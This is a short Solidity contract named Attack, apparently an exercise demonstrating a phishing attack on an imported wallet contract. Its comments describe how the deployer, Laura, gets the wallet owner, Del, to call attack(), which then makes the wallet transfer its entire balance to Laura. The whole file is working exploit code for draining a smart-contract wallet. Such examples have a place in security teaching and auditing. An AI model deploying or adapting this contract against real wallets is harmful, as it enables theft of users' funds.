pragma solidity ^0.6.6;

import "./wallet.sol";

contract Attack {
    address payable public owner;
    Wallet wallet;
    //Laura deploy this contract and be owner because msg.sender
    //and pass the address of wallet contract to the constuctor
    constructor(Wallet _wallet) public {
        wallet = Wallet(_wallet);
        owner = msg.sender;
    }

    //use Del address to execute attack function,then it become Del call transfer function 
    //which is in the wallet contract by himself and transfer money to Laura all of contract balance
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }

}